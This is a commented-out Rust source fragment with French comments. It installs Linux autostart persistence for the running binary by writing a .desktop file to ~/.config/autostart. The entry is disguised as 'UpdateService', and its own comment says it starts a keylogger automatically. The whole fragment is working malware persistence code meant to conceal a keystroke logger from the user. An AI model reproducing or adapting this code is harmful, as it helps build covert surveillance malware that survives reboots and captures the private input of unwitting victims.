// use std::env;
// use std::fs::{self, File};
// use std::io::Write;
// use std::path::PathBuf;

// pub fn setup_autostart_linux() -> std::io::Result<()> {
//     // 🔹 Résolution du chemin du dossier autostart
//     let autostart_dir = dirs::config_dir()
//         .unwrap_or_else(|| dirs::home_dir().unwrap().join(".config"))
//         .join("autostart");

//     // 🔹 Création du dossier s’il n’existe pas
//     fs::create_dir_all(&autostart_dir).map_err(|e| {
//         eprintln!(" Impossible de créer le dossier autostart : {}", e);
//         e
//     })?;

//     // 🔹 Récupération du chemin du binaire actuel
//     let exec_path = env::current_exe().map_err(|e| {
//         eprintln!(" Impossible de récupérer le chemin du binaire : {}", e);
//         e
//     })?;

//     // 🔹 Contenu du fichier .desktop
//     let desktop_entry = format!(
//         "[Desktop Entry]\n\
//         Type=Application\n\
//         Exec={}\n\
//         Hidden=false\n\
//         NoDisplay=false\n\
//         X-GNOME-Autostart-enabled=true\n\
//         Name=UpdateService\n\
//         Comment=Démarrage automatique du keylogger\n",
//         exec_path.display()
//     );

//     // 🔹 Création du fichier .desktop
//     let mut file = File::create(autostart_dir.join("update-service.desktop")).map_err(|e| {
//         eprintln!(" Erreur lors de la création du fichier autostart : {}", e);
//         e
//     })?;

//     // 🔹 Écriture dans le fichier
//     file.write_all(desktop_entry.as_bytes()).map_err(|e| {
//         eprintln!(" Échec de l’écriture dans le fichier .desktop : {}", e);
//         e
//     })?;

//     println!(" Fichier .desktop généré dans ~/.config/autostart/");

//     Ok(())
// }
